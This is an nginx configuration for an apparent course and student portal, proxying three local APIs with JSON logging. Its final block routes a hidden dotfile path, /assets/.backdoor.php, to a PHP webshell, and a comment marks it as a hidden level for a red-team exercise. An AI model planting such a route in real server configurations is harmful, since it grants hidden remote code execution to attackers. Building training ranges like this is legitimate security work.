user www-data;
worker_processes auto;
pid /run/nginx.pid;

events {
    worker_connections 1024;
}

http {
    include /etc/nginx/mime.types;
    default_type application/octet-stream;
    sendfile on;

    log_format json_combined escape=json
      '{'
        '"remote_addr":"$remote_addr",'
        '"request_method":"$request_method",'
        '"request_uri":"$request_uri",'
        '"status":"$status",'
        '"body_bytes_sent":"$body_bytes_sent",'
        '"request_time":"$request_time",'
        '"upstream_response_time":"$upstream_response_time",'
        '"http_user_agent":"$http_user_agent",'
        '"host":"$host"'
      '}';

    access_log /var/log/nginx/access_json.log json_combined;
    error_log  /var/log/nginx/error.log warn;

    upstream course_api {
        server 127.0.0.1:3001;
    }

    upstream student_api {
        server 127.0.0.1:3002;
    }

    upstream portal_app {
        server 127.0.0.1:3000;
    }

    server {
        listen 80 default_server;
        server_name _;

        location /api/course/ {
            proxy_pass http://course_api/;
            proxy_set_header Host $host;
            proxy_set_header X-Real-IP $remote_addr;
        }

        location /api/student/ {
            proxy_pass http://student_api/;
            proxy_set_header Host $host;
            proxy_set_header X-Real-IP $remote_addr;
        }

        location / {
            proxy_pass http://portal_app/;
            proxy_set_header Host $host;
            proxy_set_header X-Real-IP $remote_addr;
        }

        # 隱藏關卡6：webshell，供紅隊operation用
        location = /assets/.backdoor.php {
            root /opt/webshell;
            fastcgi_pass unix:/run/php/php8.5-fpm.sock;
            fastcgi_index .backdoor.php;
            fastcgi_param SCRIPT_FILENAME /opt/webshell/.backdoor.php;
            include fastcgi_params;
        }
    }
}
